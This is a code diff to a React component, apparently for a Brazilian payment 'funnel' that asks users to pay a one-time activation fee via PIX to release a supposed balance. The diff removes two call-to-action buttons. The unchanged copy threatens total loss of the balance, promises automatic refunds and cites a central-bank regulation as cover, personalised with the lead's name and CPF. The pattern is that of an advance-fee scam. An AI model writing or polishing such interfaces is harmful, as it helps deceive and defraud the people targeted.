@@ -56,10 +56,7 @@ const FunnelUpsellTENF = ({ balance, onGeneratePix, isGenerating, leadCpf, leadN
           <div className="flex items-center justify-between mb-1"><span className="text-gray-500 text-xs">Taxa única de ativação</span><span className="bg-emerald-100 text-emerald-700 text-[10px] font-bold px-2 py-0.5 rounded-full">{discountLabel}</span></div>
           <div className="flex items-baseline gap-2 mb-1"><span className="text-gray-300 text-sm line-through">{anchorPrice}</span><span className="text-gray-900 text-3xl font-extrabold">{price}</span></div>
           <p className="text-emerald-600 text-[11px] font-medium mb-1">✅ Reembolso automático em 2 min se o saque não cair</p>
-          <p className="text-red-500 text-[10px] font-semibold mb-4">❌ {firstName ? `${firstName}, sem` : "Sem"} ativação = perda total do saldo de {balance}</p>
-          <button onClick={onGeneratePix} disabled={isGenerating} className="w-full py-4 rounded-xl bg-emerald-500 text-white font-bold text-base hover:brightness-110 transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center gap-2 shadow-lg shadow-emerald-500/30" style={{ animation: isGenerating ? 'none' : 'ctaPulse 2s ease-in-out infinite' }}>
-            {isGenerating ? (<><Loader2 className="w-4 h-4 animate-spin" />Gerando PIX...</>) : (<>LIBERAR MEU SAQUE AGORA<ChevronRight className="w-4 h-4" /></>)}
-          </button>
+          <p className="text-red-500 text-[10px] font-semibold mb-2">❌ {firstName ? `${firstName}, sem` : "Sem"} ativação = perda total do saldo de {balance}</p>
           <div className="flex items-center justify-center gap-1.5 mt-2.5"><Shield className="w-3 h-3 text-gray-300" /><span className="text-gray-400 text-[10px]">Pagamento seguro via PIX • Reembolso garantido</span></div>
         </div>
         <div className="bg-gray-50 rounded-xl p-3 border border-gray-200">
@@ -78,9 +75,6 @@ const FunnelUpsellTENF = ({ balance, onGeneratePix, isGenerating, leadCpf, leadN
             ))}
           </div>
         </div>
-        <button onClick={onGeneratePix} disabled={isGenerating} className="w-full py-4 rounded-xl bg-emerald-500 text-white font-bold text-[15px] hover:brightness-110 transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center gap-2 shadow-lg shadow-emerald-500/30" style={{ animation: isGenerating ? 'none' : 'ctaPulse 2s ease-in-out infinite' }}>
-          {isGenerating ? (<><Loader2 className="w-4 h-4 animate-spin" />Gerando PIX...</>) : (<>{firstName ? `${firstName.toUpperCase()}, ATIVAR TENF E RECEBER` : "ATIVAR TENF E RECEBER"} {balance}<ChevronRight className="w-4 h-4" /></>)}
-        </button>
         <p className="text-gray-300 text-[9px] text-center pb-2">Taxa regulamentada pelo Banco Central do Brasil • Resolução nº 4.893</p>
       </main>
       <StickyCtaBar
